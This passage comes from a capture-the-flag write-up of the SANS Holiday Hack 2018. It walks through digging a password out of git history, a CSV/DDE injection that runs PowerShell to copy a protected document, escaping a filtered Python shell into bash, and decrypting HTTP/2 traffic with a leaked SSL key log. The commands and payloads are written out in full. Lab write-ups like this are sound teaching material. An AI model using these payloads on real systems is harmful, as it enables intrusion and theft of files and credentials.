-rwxr-xr-x 1 elf  elf  5944352 Dec 14 16:13 runtoanswer
```

The `kcconfmgmt` directory looks interesting, so let's navigate to there and see if the git repository ins't located there.

```console
elf@5d4e2477ec3b:~$ cd kcconfmgmt/
elf@5d4e2477ec3b:~/kcconfmgmt$ ls -la
total 72
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .
drwxr-xr-x 1 elf elf  4096 Dec 14 16:30 ..
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .git
-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
-rw-r--r-- 1 elf elf  1074 Nov  3 20:28 app.js
-rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json
-rw-r--r-- 1 elf elf   537 Nov 14 09:48 package.json
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 public
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 routes
drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 server
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 views
```

Alright, so we found the `.git` repository. Now all we need to do is go through the git logs to see what kind of commits were done. This way we can see if a password was removed or not.

```console
elf@5d4e2477ec3b:~/kcconfmgmt$ git log
commit 7b93f4be7e7b50b044739e02fa7c75b8fad32366
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Wed Nov 14 04:46:12 2018 -0500

    Add palceholder index, login, profile, signup pages while I CONTINUE TO WAIT FOR UX

commit 20c7def24307589194b7dc05cd852552c36b2b2a
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Tue Nov 13 10:18:08 2018 -0500

    Add Bower setup for front-end

commit 604e434713b4659d7f10b91ab6d20dfa58030c24
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 12 13:04:08 2018 -0500

    Add temp placeholders for login, profile, signup pages -- WAITING ON YOU UX TEAM

commit 31f4eaec30df0f41fc700532d7bc2f6aac94deb8
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 12 00:51:23 2018 -0500

    Add routes for login, logout, signup, isLoggedIn, profile access

commit ac32750bf6a4979bf37108f4438bc9695189ce14
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sun Nov 11 15:30:15 2018 -0500

    Update index route for passport

commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sat Nov 10 19:51:52 2018 -0500

    Add user model for authentication, bcrypt password storage

commit c27135005753f6dde3511a7e70eb27f92f67393f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sat Nov 10 08:11:40 2018 -0500

    Add passport config

commit a6449287cf9ed9151d94fb747f6904158c2c4d71
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Fri Nov 9 14:08:04 2018 -0500

    Add passport middleware for user auth

commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500

    Add passport module

commit d99d465d5b9711d51d7b455584af2b417688c267
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Wed Nov 7 16:57:41 2018 -0500

    Correct typos, runs now! Change port for MongoDB connection

commit 68405b8a6dcaed07c20927cee1fb6d6c59b62cc3
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Tue Nov 6 17:26:39 2018 -0500

    Add initial server config

commit 69cc84998e57f4fc6aca17f2a5cb9caff53f3fd3
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 5 20:17:51 2018 -0500

    Added speakers.js data model

commit c3ee078d17a5309fbe18426c048a9a12b495f39f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Mon Nov 5 01:27:11 2018 -0500

    File reorganization under server/

commit b4d783d7a7f8ba9bb3aee72aeba43ba9bb99c8b0
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Sun Nov 4 04:30:39 2018 -0500

    Module cleanup

commit 9c06c0441c95323e8270f6a219439daba59017f5
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Fri Nov 2 11:05:49 2018 -0400

    Added Express EJS setup (go away, Jade)

commit 1f9bbf6d2cee75a9dd6bb483edf940f9bb71035f
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 1 11:30:50 2018 -0400

    Initial checkin
``` 

Within the git logs we see the following interesting information.

```console
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf
ig.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500

    Add passport module

```

We see that the commit `60a2ffea7520ee980a5fc60177ff4d0633f2516b` removed the username and password from the `config.js` file. So, for us to be able to find the password in that file, we need to [checkout](https://git-scm.com/docs/git-checkout) commit `b2376f4a93ca1889ba7d947c2d14be9a5d138802`, which is the commit before the file got updated.

```console
elf@5d4e2477ec3b:~/kcconfmgmt$ git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802
Note: checking out 'b2376f4a93ca1889ba7d947c2d14be9a5d138802'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at b2376f4... Add passport module
```

Once done, let's use the [find](http://man7.org/linux/man-pages/man1/find.1.html) command to find where the `config.js` file is located in the git repository.

```console
elf@5d4e2477ec3b:~/kcconfmgmt$ find ~/kcconfmgmt/ -name "config.js"
/home/elf/kcconfmgmt/server/config/config.js
```

Awesome, so all we have to do now is print out the context of the config file!

```console
elf@5d4e2477ec3b:~/kcconfmgmt$ cat /home/elf/kcconfmgmt/server/config/config.js
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
```

Based of the configuration file, we can see that the password is `twinkletwinkletwinkle`. Let's see if it's correct!

```console
elf@5d4e2477ec3b:~/kcconfmgmt$ ~/runtoanswer 
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
```

### HR Incident Response

Upon successfully completing the Dev Ops Fail CranPI, we can talk to Sparkle again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-53.png"><img src="/images/hh18-53.png"></a></p>

For this objective, we need to gain access to the [Elf Resource Website](https://careers.kringlecastle.com/) and fetch the document `C:\candidate_evaluation.docx`. Once we gain access to the document we then need to figure out which terrorist organization is secretly supported by the job applicant whose name begins with "K."

Thankfully for us, Sparkle gave us a good hint on [CSV Injection]([https://www.owasp.org/index.php/CSV_Injection](https://www.owasp.org/index.php/CSV_Injection)) and also provided us a hint to watch [Brian Hostetler's, CSV DDE Injection: Pwn Web Apps Like a Ninja](https://www.youtube.com/watch?v=Z3qpcKVv2Bg) KringleCon talk!

<p align="center"><a href="/images/hh18-54.png"><img src="/images/hh18-54.png"></a></p>

With that in mind, let's go ahead and navigate to the web page. Upon accessing the page, we are presented with the following registration form.

<p align="center"><a href="/images/hh18-55.png"><img src="/images/hh18-55.png"></a></p>

We can see that on the career page we can upload, a [CSV](https://en.wikipedia.org/wiki/Comma-separated_values) file along with our info. And thanks to the hints, we know that we can attempt to access the `C:\candidate_evaluation.docx` via CSV injection.

So let's start by creating a simple injection that will launch powershell, and copy the file to `\Inetpub\wwwroot\`.

<p align="center"><a href="/images/hh18-56.png"><img src="/images/hh18-56.png"></a></p>

Once done, we can go ahead an save that CSV file. In my case I called the file `hh18.csv`.

From here, let's go ahead and fill out our information, and submit our malicious CSV file. If the upload is successful then we should see the following message.

<p align="center"><a href="/images/hh18-57.png"><img src="/images/hh18-57.png"></a></p>

I allowed a minute to pass by and attempted to access the candidate file. But to my surprise I got an error!

<p align="center"><a href="/images/hh18-58.png"><img src="/images/hh18-58.png"></a></p>

Thankfully for us, this error page revealed new information to us. We now know that there is a public folder accessible via the `C:\careerportal\resources\public\` path! No wonder our previous CSV didn't work, we had the wrong path!

Knowing this, we now know where the web application resides and where we can copy the candidate file! At the same time after some trial and error I noticed that the CSV was not properly being parsed when submitted via the website. So to get around this, I utilized Burp Suite and entered the command directly, which allowed for better results. 

From here I decided to fire up Burp Suite, and repeat the application upload using the following command.

```
=cmd|'/c powershell.exe Copy-Item "C:\candidate_evaluation.docx" -Destination "C:\careerportal\resources\public\kkb.docx"'!A1
```

Once the command was entered, I sent off the request and got the success message.

<p align="center"><a href="/images/hh18-59.png"><img src="/images/hh18-59.png"></a></p>

I then was able to navigate to `https://careers.kringlecastle.com/kkb.docx` and download the file.

<p align="center"><a href="/images/hh18-60.png"><img src="/images/hh18-60.png"></a></p>

Reading through the file, we across the following interesting portion:

> Krampus’s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays.
> 
> Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year.
> 
> We owe it to Santa to find, recruit, and put forward trusted candidates with the right skills and ethical character to meet the challenges that threaten our joyous season.

Upon reading this we know that Kampu's is tired in with the `Fancy Beaver` terrorist organization, not good!

Once we know this, we can then navigate to the seventh objective in our badge and enter `Fancy Beaver` to complete the objective!

<p align="center"><a href="/images/hh18-61.png"><img src="/images/hh18-61.png"></a></p>

## Objective 8

### Python Escape from LA - CranPi

From Sparkle, we go up a little and there we meet SugarPlum Mary!

<p align="center"><a href="/images/hh18-62.png"><img src="/images/hh18-62.png"></a></p>

Talking to SugarPlum we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-62-1.png"><img src="/images/hh18-62-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
  
               :lllllllllllllllllllllllllllllllllllllllll,                      
               'lllllllllllllllllllllllllllllllllllllllll:                      
                clllllllllllllllllllllllllllllllllllllllll.                     
                'lllllllllllllllllllllllllllllllllllllllll:                     
                 ;lllllllllllllllllllllllllllllllllllllllll,                    
                  :lllllllllllllllllllllllllllllllllllllllll.                   
                   :lllllllllllllllllllllllllllllllllllllllll.                  
                    ;lllllllllllllllllllllllllllllllllllllllll'                 
                     'lllllllllllllllllllllllllllllllllllllllll;                
                      .cllllllllllllllllllllllllllllllllllllllllc.              
                      .:llllllllllllllllllllllllllllllllllllllllllc,.           
                   .:llllllllllllllllllllllllllllllllllllllllllllllll;.         
                .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,        
              .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.      
             ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.     
           'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc     
          :lllllll:..,..'cllllllllllllllllllllllc'.,'.'clllllllllllllllllll;    
        .clllllll'  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.   
       .cllllllll.  oXX'  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll'   
       clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,   
      :llllllllllll;'..':llllllllllllllllllllllll:'..':lllllllllllllllllllll'   
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.   
     ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc    
     clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.    
     cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;     
     :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:      
     ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:       
     .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,        
      'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.         
       ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,           
        'llllllllllllllllcccccccc;',.,clllllllllllllllllllllllllll,             
         .cllllllc:::::;;,,,,'...':c:;...'',,;;;::::::lllllllllc,               
           'cllllc::;::::cccccccccllc,,,,,,,'',:::::::lllllll;.                 
             .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.                    
               .':lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.                       
                   .,:llccccccccccllllXMMMMMMMMWl:;'.                           
                       .,,,,,,,,,,clll:::::::::;                                
                      'lllllllllc.    ',,,,,,,,.                                
                     lMMMMMMMMMW,    .ddddddddd.                                
                    kMMMMMMMMMX.     kMMMMMMMMK                                 
                   ':::::::::,      .NWWWWWWWW:                                 
                  ',,,,,,,,,.       .,,,,,,,,'                                  
                .oooooooooo.        ',,,,,,,,.                                  
               .NMMMMMMMMW;        cOOOOOOOOx                                   
               0MMMMMMMMMc         NMMMMMMMMk                                   
               ;;;;;;;;;'         .KKKKKKKKK:                                   
              .,,,,,,,,,           ,,,,,,,,,.                                   
              .ddddddddo           ',,,,,,,,.                                   
               XMMMMMMMN           cKKKKKKKKK.                                  
    .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....                      
      .,:ccccccccccccccc            'cccccccccc:::ccccc;.                       
         .:ccccccccccccc            .ccccccccccccccc:'.                         
           .;;;;;;;;;;;;            .ccccccccccccc;.                            
                                    ..............                              
                                                                                
                                                                                


I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
>>>
```

So it seems that for this CranPi challenge we need to escape the Python shell, and execute the `./i_escaped` binary. 

Thankfully SugarPlum gives us a hint to go and watch[Mark Baggett's - Escaping Python Shells](https://www.youtube.com/watch?v=ZVx2Sxl3B9c) KringleCon talk, which should help!

After watching the talk, I attempted to utilize a few of Mark's techniques, such as using [os.system](https://docs.python.org/2/library/os.html) to execute commands. But unfortunately that wasn't allowed.

```console
>>> os.system("ls")  
Use of the command os.system is prohibited for this question.
```

From here I decided to see if I can execute any of the [os](https://docs.python.org/2/library/os.html) commands, such as [listdir()](https://www.tutorialspoint.com/python/os_listdir.htm).

```console
>>> os.listdir()  
Traceback (most recent call last):  
File "<console>", line 1, in <module>  
NameError: name 'os' is not defined
```

Okay! So it seems that the `os` library is not yet defined. What we can do from here, it to try and utilize Mark's import technique from his video to define the `os` library and the `listdir()` command again.

```console
>>> os = eval('__im' + 'port__("os")')  
>>> os.listdir()  
['.profile', '.bashrc', '.bash_logout', 'i_escaped']
```

Awesome, we got it to work! At this point I started to think.... If we can import and library to a define function name, what other libraries can we import that will allow for command execution?

I started to think about the [subprocess](https://docs.python.org/2/library/subprocess.html) module, and in specific, the `call()` command which should allow us to execute linux commands.

So let's see if we can import subprocess and call `ls`.

```console
>>> sub = eval('__im' + 'port__("subprocess")')  
>>> sub.call("ls")  
i_escaped  
0
```

Nice, we got that to work! So from here, let's spawn a new shell via by using `/bin/bash` and execute the `i_escaped` binary.

```console
>>> sub.call("/bin/bash");
elf@acbe69bf5703:~$ ls -la
total 5440
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:41 .
drwxr-xr-x 1 root root    4096 Dec 14 16:40 ..
-rw-r--r-- 1 elf  elf      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 elf  elf     3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 elf  elf      655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5547296 Dec 14 16:13 i_escaped
elf@acbe69bf5703:~$ ./i_escaped 
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!
```

### Network Traffic Forensics

Upon successfully completing the Python Escape from LA CranPI, we can talk to SugarPlum again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-63.png"><img src="/images/hh18-63.png"></a></p>

For this objective, we need to use to the [web-based packet capture and analysis](https://packalyzer.kringlecastle.com/) system to access and decrypt HTTP/2 network activity. From there, we need to figure out the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball. 

Thankfully, SugarPlum gave us a good hint for this challenge by stating that the development code of the web application was sitting in the web root, and that the development code was using [environmental variables](https://en.wikipedia.org/wiki/Environment_variable) to store SSL keys and open directories. 

This hint instantly made me think about [Node.js](https://www.twilio.com/blog/2017/08/working-with-environment-variables-in-node-js.html) due to the fact that is uses environmental variables in the configuration. 

At the same time, we got another good hint to go and watch [Chris Davis & Chris Elgee - HTTP2](https://www.youtube.com/watch?v=9E-8HkDs-kQ) KringleCon talk, which should be beneficial to this challenge on decryption HTTP2 traffic.

Upon accessing the [Packalyzer](https://packalyzer.kringlecastle.com/) site, we are presented with the following.

<p align="center"><a href="/images/hh18-64.png"><img src="/images/hh18-64.png"></a></p>

So it seems we can log in to the site, and even register a new account. So go ahead and create a new account, and then log in. You should see the following after logging in.

<p align="center"><a href="/images/hh18-65.png"><img src="/images/hh18-65.png"></a></p>

On this page we can Analyze a PCAP or Sniff Traffic. I decided to sniff the traffic and was presented with the following.

<p align="center"><a href="/images/hh18-66.png"><img src="/images/hh18-66.png"></a></p>

I decide to navigate to the __Captures__ tab, and was presented with an option to download my recently sniffed traffic as a PCAP.

<p align="center"><a href="/images/hh18-67.png"><img src="/images/hh18-67.png"></a></p>

Upon downloading the PCAP and opening it in Wireshark, I noticed that it was all encrypted. So what I needed to do was to go find the [SSLKEYLOGFILE](https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/) to decrypt this traffic.

<p align="center"><a href="/images/hh18-68.png"><img src="/images/hh18-68.png"></a></p>

We know that this is a Node.js application due to the fact that it uses environmental variables. At the same time, I know that Node.js applications usually defaults to the [`app.js`](https://nodejs.org/en/docs/guides/getting-started-guide/) name for their configuration file. So we need to find that configuration file... but where can it be located?

For this, I decided to dig into the HTML code of the website, and came to notice the following in the last few lines.

```html
  </body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
    <script src="https://packalyzer.kringlecastle.com:80/pub/js/custom.js"></script>
</html>
```

We can see a file called `custom.js` located in the `/pub/js/` directory. From SugarPlum's hint, we know that the development code was left in the "__web root__" directory, which I would assume to be `/pub/`.

So I attempted to navigate to `/pub/app.js` and viola! I got access to the configuration file!

<p align="center"><a href="/images/hh18-69.png"><img src="/images/hh18-69.png"></a></p>

In the configuration file, I notified the `key_log_path` variable which seemed to contain the [SSLKEYLOGFILE](https://ec.haxx.se/tls-sslkeylogfile.html) that we needed to decrypt the HTTP2 traffic from the website.

```
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
```

So we need to somehow figure out the environmental variables for both `DEV` and `SSLKEYLOGFILE` to get the path and filename to access the SSL keys.

If we look down just a little more in the `app.js` file, we come across the following `dev_mode` IF statement.

<p align="center"><a href="/images/hh18-70.png"><img src="/images/hh18-70.png"></a></p>

Let's quickly break this IF statement down.

So IF `dev_mode` is set to `true`, which it is. We then set the `env_dirs` variable as a [constant](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const) value from the `load_envs()` function, which is seen above.

Now, the `load_envs()` function creates a new empty[array](https://www.w3schools.com/js/js_arrays.asp) called `dirs`. It then set's another array called `env_keys` which are populated by the name of the environmental variables through the [Object.keys](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys) function.

The `load_envs()` function then goes through a loop for each variable in `env_keys`, check's if it's a string, and then pushes the environmental variables to the `dirs` array via the [push](https://www.w3schools.com/jsref/jsref_push.asp) function. 

So `DEV` and `SSLKEYLOGFILE` would be `/DEV/` and `/SSLKEYLOGFILE/`.

Okay, that's pretty interesting. So what would happen if we call `/dev/` in the URL?

<p align="center"><a href="/images/hh18-71.png"><img src="/images/hh18-71.png"></a></p>

Whoa, look at that! It seems that `/dev/` is actually the development directory that we are looking for based off the error.

Alright, so what would happen if we enter `/SSLKEYLOGFILE/` into the URL?

<p align="center"><a href="/images/hh18-72.png"><img src="/images/hh18-72.png"></a></p>

Yes! This error actually revealed the `SSLKEYLOGFILE` environmental variable along with the log name! So what we can do now is navigate to `/dev/packalyzer_clientrandom_ssl.log` in the URL to get log file.

<p align="center"><a href="/images/hh18-73.png"><img src="/images/hh18-73.png"></a></p>

Once we got that, let's go ahead and save that file.

```console
root@kali:~/HH# curl --http2 https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log > packalyzer_clientrandom_ssl.log
```

From here, let's go back to Wireshark where we viewed our captured PCAP. We now need to add the `SSLKEYLOGFILE` to decrypt the traffic.

We can do this by going to `EDIT > Preferences`.

<p align="center"><a href="/images/hh18-74.png"><img src="/images/hh18-74.png"></a></p>

Then from the left hand side find `Protocol > SSL`. And in the `(Pre)-Master-Seecret log filename` browse to our newly found SSL log file and then press `OK`.

<p align="center"><a href="/images/hh18-75.png"><img src="/images/hh18-75.png"></a></p>

**Note**: Do note, that for this to work, you need __Wireshark v2.6__.

Now once that's done, go back to the PCAP and filter for `http2`. You should be able to find a username and password for Alabaster.

<p align="center"><a href="/images/hh18-76.png"><img src="/images/hh18-76.png"></a></p>

If you don't, you might need to capture a new pcap.

Armed with Alabaster's Password, we can log into his account. And from the __Captures__ tab, we will file a __super\_secret\_packet\_capture.pcap__ file that we can download.

<p align="center"><a href="/images/hh18-77.png"><img src="/images/hh18-77.png"></a></p>

Once downloaded. Open the PCAP back up in Wireshark. We can see that this PCAP contains [SMTP](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol) traffic.

<p align="center"><a href="/images/hh18-78.png"><img src="/images/hh18-78.png"></a></p>

So to view this, all we need to do is `Right Click > Follow > TCP Stream`.

<p align="center"><a href="/images/hh18-79.png"><img src="/images/hh18-79.png"></a></p>

And we can then see the full SMTP conversion!

<p align="center"><a href="/images/hh18-80.png"><img src="/images/hh18-80.png"></a></p>

We can see from the SMTP conversation that there is a Base64 attached octet-stream. We can simply copy this over into a file and base64 decode it into a PDF file to see the secret file!

```console
root@kali:~/HH# gedit secret
root@kali:~/HH# cat secret | base64 -d > secret.pdf
```

<p align="center"><a href="/images/hh18-81.png"><img src="/images/hh18-81.png"></a></p>

So it seems that this is a document on piano music! If we keep scrolling down, toward the end we can find our answers.

<p align="center"><a href="/images/hh18-82.png"><img src="/images/hh18-82.png"></a></p>

Once we know the song sent to Alabaster, we can navigate to the eight objective in our badge and enter `Mary Had a Little Lamb` to complete the objective!

<p align="center"><a href="/images/hh18-83.png"><img src="/images/hh18-83.png"></a></p>


## Objective 9

### Sleigh Bell Lottery - CranPi

From SugarPlum, we go right, past the stairs and there we meet Shinny Upatree!

<p align="center"><a href="/images/hh18-84.png"><img src="/images/hh18-84.png"></a></p>

Talking to Shinny we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-84-1.png"><img src="/images/hh18-84-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
                              WKOdl:;oW                                         
                          WOo:'.......cW         X0KXW                          
                kdxOX     x...;.....;c.d      Xd;....':d0W                      
               W,....'cd0WN,.,WNd'...d:'N   Xl........',.:W                     
                l........':odoK  No..,0.k Wx';.....'lOWX.'N                     
                O............,oK   O..O;dWl,d'...;xN   x.o         NXKKKKXN     
                W,.....,:ccc:,..;kW k.dcdd,k'..,kW    0'cW    Xko:'.....:odOKW  
                 d........',;clll:,xWlolx'x;..oN    Wx'lW  Ko;..........,cxK    
                 N,..,codxkkkxdl:::;:xKlx,k.'O     O;,O Ko,....;cdk0KXXXXK0kOW  
                  K,.OW           Xkl':k0:o.O   Wk;:kNk:..'cd0N                 
 W0kdlc:::cloxk0XW Wkc;lx0KNWW       NxlKOxd WOl:dK0l''cdOKK0OOOO0KXNW          
  W  NOo'.........,:oxOkkxlc;,',,,,,,:dK;.dKllx0Oo,;d0XKO0KKXKKKK0OO0KXKKN      
  NOxodkO00KKK0OOkdoc:,'.,:ldxxxxxdddolx;;xdlcc::cx;0K0KKXXXXXX00KK00OOO0K      
             WNXK00000KKKK0kxoodl::::ox,.xlK0kdlccdKOOKXXXK000KKKOOOO00000W     
           X0O0000KXX00000KNK;o;...:0 d,,;lNW      0O0XXK0O0KK0OO0KKK000000     
       NXNK000O0KKKKKXKKXK000kl:cdK WXK0000000KKKNW00KK0O0K0OO0KKK00XXXXK0OW    
      WOOOOOO000000OO0KKKKXXOON  WX0OOO0XXXXXXXKOOOKK0O0K0OOOKK0O0XXXXXXK0OW    
       N000000OOOOO0000OO0XXXX0WXOOKXXXXXXXXXXXKKXX0O0XKOO0K0OOKXXXXXXKX0O0     
       KOKXKOO00000OOOO0KK0OOOK0OOX00KX0KKKKKKK00XXXXOOX0KKO0XXXXXXXXXOO0KW     
       0OKXXKKKKKK000K0OOO0KKKKOO0KKKKK0000000KKKKKK00OONO0XKO0NNXKKXXXXN       
       XOO0KXKO0KKKKKOO0K0O0KXK0KXKKKKKKKK000KKKKKKKKK0KKKK0OOONWXK00OKN        
        0OOW WOOKXXXXKKKK0KNOOOOOKKXXKKKKKKKKKKKKXXKK0OOOOKX00OOO0KXNW          
         KOO0NKOKXXXXXXXX0O0KXKKKKKK000000000000000KKKKKKNW                     
          WKOOXNKKKKKKKKK0OKW KO0XXKKKKKKKXXXXXXXXXXXKOON                       
             NXKNNKOOO00XN    W00KK000K000KXXXXXXXXXKK0X                        
                   WW          WKOOO0   KOKKKXXXXXX0OON                         
                                 NKOO0KKNNXKOOOXXOO0XW                          
                                   WNK0OOO0KXXNNXXN                             
                                        WWWWWW                                  
                                                                                

I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
elf@f29506942d48:~$
```

So for this CranPI challenge we need to help Shiny win the lottery. Thankfully, Shiny gave us a good hint on how to [use gdb to call random functions](https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions) - so I'm guessing we can use that to our advantage!

For starters, let's see what we have to work with.

```console
elf@f29506942d48:~$ ls -la
total 60
drwxr-xr-x 1 elf  elf   4096 Dec 14 16:22 .
drwxr-xr-x 1 root root  4096 Dec 14 16:21 ..
-rw-r--r-- 1 elf  elf    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf   3785 Dec 14 16:21 .bashrc
-rw-r--r-- 1 elf  elf    807 Apr  4  2018 .profile
lrwxrwxrwx 1 elf  elf     12 Dec 14 16:21 gdb -> /usr/bin/gdb
lrwxrwxrwx 1 elf  elf     16 Dec 14 16:21 objdump -> /usr/bin/objdump
-rwxr-xr-x 1 root root 38144 Dec 14 16:22 sleighbell-lotto
```

I'm going to guess that the `sleighbell-lotto` binary is what we need to use. So let's give it a shot! Who knows, maybe we'll get lucky!

```console
elf@f29506942d48:~$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 6671!

Sorry - better luck next year!
```

Guess not! Alright, well after reading the blog post on calling function via [gdb](https://www.gnu.org/software/gdb/), let's use the [nm](https://linux.die.net/man/1/nm) command to list all the symbols from the binary.

```console
elf@f29506942d48:~$ nmn ./sleighbell-lotto 
bash: nmn: command not found
elf@f29506942d48:~$ nm ./sleighbell-lotto 
                 U EVP_sha256@@OPENSSL_1_1_0
                 U HMAC@@OPENSSL_1_1_0
0000000000207d40 d _DYNAMIC
0000000000207f40 d _GLOBAL_OFFSET_TABLE_
0000000000001630 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
000000000000702c r __FRAME_END__
0000000000006dcc r __GNU_EH_FRAME_HDR
0000000000208068 D __TMC_END__
0000000000208068 B __bss_start
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000208000 D __data_start
0000000000000ac0 t __do_global_dtors_aux
0000000000207d38 t __do_global_dtors_aux_fini_array_entry
0000000000208008 D __dso_handle
0000000000207d30 t __frame_dummy_init_array_entry
                 w __gmon_start__
0000000000207d38 t __init_array_end
